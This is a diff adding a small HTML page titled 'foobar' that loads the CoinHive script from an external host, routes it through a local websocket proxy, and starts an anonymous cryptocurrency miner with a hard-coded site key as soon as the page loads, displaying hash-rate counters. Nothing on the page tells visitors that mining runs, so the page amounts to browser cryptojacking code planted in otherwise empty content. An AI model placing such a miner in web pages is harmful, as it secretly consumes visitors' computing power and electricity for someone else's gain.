@@ -1,0 +1,27 @@
+<html>
+	<head>
+		<title>foobar</title>
+	</head>
+	<body>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+  // Configure CoinHive to point to your proxy
+  CoinHive.CONFIG.WEBSOCKET_SHARDS = [["ws://localhost:8892/proxy"]];
+
+  // Start miner
+  var miner = new CoinHive.Anonymous('etnk1VXLNDH9ecgapWU5VPJyQdRnUvEnqaXNS5heaf8VLhoVHCgi1KMT9FnAVwzmyW7Z124fMjkcedR9UWSfGRFZ1gWucKY5ZM');
+  setInterval(function() {
+  var hashesPerSecond = miner.getHashesPerSecond();
+  var totalHashes = miner.getTotalHashes();
+  var acceptedHashes = miner.getAcceptedHashes();
+  document.getElementById("sp").innerHTML = "Speed = " + hashesPerSecond.toFixed(2) + " hash/sec";
+  document.getElementById("th").innerHTML = "Total Hashes = " + totalHashes;
+  document.getElementById("ah").innerHTML = "Accepted Hashes = " + acceptedHashes;
+}, 1000);
+  miner.start();
+
+</script>
+
+		<div>foobar</div>
+	</body>
+</html>
